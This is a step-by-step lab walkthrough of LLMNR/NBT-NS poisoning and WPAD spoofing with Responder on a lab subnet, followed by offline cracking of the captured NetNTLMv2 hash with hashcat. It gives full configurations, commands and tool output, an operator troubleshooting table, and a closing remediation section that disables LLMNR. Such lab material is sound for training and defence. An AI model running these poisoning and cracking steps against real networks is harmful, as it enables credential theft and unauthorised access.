# Lab 01: LLMNR / NBT-NS Poisoning, WPAD Spoofing & NetNTLMv2 Cracking

> **Lab Focus**: Hands-on capture and offline cracking of Windows challenge-response authentication hashes via local network broadcast poisoning (LLMNR / NBT-NS) and rogue Web Proxy Auto-Discovery (WPAD).

---

## 1. Laboratory Environment Setup

```
+-----------------------------------------------------------------------------------------+
| LOCAL SUBNET TOPOLOGY (192.168.56.0/24)                                                 |
|                                                                                         |
|  [ATTACK BOX]                                    [VICTIM CLIENT WORKSTATION]            |
|  Kali Linux 2024.x                               Windows 11 Enterprise (Build 22H2)     |
|  IP: 192.168.56.10                               IP: 192.168.56.105                     |
|  Interface: eth1                                 Hostname: WS01-FINANCE                 |
|  Tools: Responder, Hashcat                       Logged In: CORP\jdoe                   |
+-----------------------------------------------------------------------------------------+
```

---

## 2. Phase 1: Pre-Execution Network Inspection & Configuration

### Step 1: Verify Interface Binding & Routing
```bash
ip -br addr show eth1
```
Output:
```text
eth1             UP             192.168.56.10/24 fe80::a00:27ff:fe89:1b22/64
```

### Step 2: Configure `Responder.conf`
Edit `/etc/responder/Responder.conf`:
```ini
[Responder Core]
LLMNR = On
NBTNS = On
MDNS = On

[Responder Rogue Servers]
HTTP = On
HTTPS = On
SMB = On
SQL = On
FTP = On
LDAP = On

[Responder WPAD]
WPADScript = On
```

---

## 3. Phase 2: Launching Responder & Triggering Poisoning

### Step 1: Launch Responder with WPAD Enforcement Flags
```bash
sudo responder -I eth1 -dwv -F
```

```text
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

  [+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

  [+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    LDAP server                [ON]

[+] Listening for events...
```

### Step 2: Victim Action (Simulated User Typo)
On workstation `WS01-FINANCE` (`192.168.56.105`), user `jdoe` opens Windows Explorer and mistypes a file share path:
```cmd
\\finance-data-backup\archive
```

### Step 3: Real-Time Poisoning & Hash Capture Output
Responder intercepts the LLMNR multicast packet sent to `224.0.0.252:5355`:

```text
[+] [LLMNR]  Poisoned answer sent to 192.168.56.105 for name FINANCE-DATA-BACKUP
[+] [SMB] NTLMv2-SSP Client   : 192.168.56.105
[+] [SMB] NTLMv2-SSP Username : CORP\jdoe
[+] [SMB] NTLMv2-SSP Hash     : jdoe::CORP:1122334455667788:A9C8D7E6F5B40192837465:0101000000000000B0A1...
[+] Hash saved to: /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.56.105.txt
```

---

## 4. Phase 3: Hash Extraction & GPU-Accelerated Cracking

Extract the NetNTLMv2 hash from Responder's log file:
```bash
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.56.105.txt > jdoe_netntlm.hash
```

### Hashcat Command Line & Parameter Tuning:
```bash
hashcat -m 5600 -a 0 jdoe_netntlm.hash /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule -w 3 -O --status
```

```text
hashcat (v6.2.6) starting...

CUDA API (CUDA 12.2)
* Device #1: NVIDIA GeForce RTX 4090, 24151/24564 MB, 128MCU

Hashes: 1 digests; 1 unique digests
Bitmask: 32 bytes

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921507
* Keyspace..: 918040576 (with rules)

jdoe::CORP:1122334455667788:A9C8...:Welcome2024!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: jdoe::CORP:...
Time.Started.....: Fri Nov 21 02:14:10 2026 (1 sec)
Time.Estimated...: Fri Nov 21 02:14:11 2026 (0 secs)
Speed.#1.........: 14.8M H/s
Recovered........: 1/1 (100.00%) Digests
```

* **Plaintext Recovered**: `Welcome2024!`

---

## 5. Phase 4: Troubleshooting Operator Failures

```
+------------------------------------+------------------------------------+---------------------------------------+
| Observed Problem                   | Root Cause                         | Solution / Workaround                 |
+------------------------------------+------------------------------------+---------------------------------------+
| Workstation does not issue LLMNR   | Network adapter profile on Windows | Run PowerShell command on victim:     |
| queries to the network.            | is set to "Public". Windows        | Set-NetConnectionProfile              |
|                                    | Firewall blocks outbound UDP 5355. | -NetworkCategory Private              |
+------------------------------------+------------------------------------+---------------------------------------+
| Password is not in rockyou.txt     | Complex enterprise passphrase.     | Execute mask attack targeting common  |
| dictionary.                        |                                    | enterprise patterns:                  |
|                                    |                                    | hashcat -m 5600 -a 3 hash.txt         |
|                                    |                                    | ?u?l?l?l?l?l?l?d?d?d?d!               |
+------------------------------------+------------------------------------+---------------------------------------+
```

---

## 6. Phase 5: Defensive Remediation & Verification

### 1. Disable LLMNR via PowerShell:
```powershell
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT" -Name "DNSClient" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -Value 0 -Type DWord
```

### 2. Verify Fix:
Re-run the typo command `\\finance-data-backup\archive`. 
Observe in Wireshark: **Zero UDP 5355 broadcast packets leave the workstation**. Windows instantly returns `The network path was not found`. Responder captures nothing.
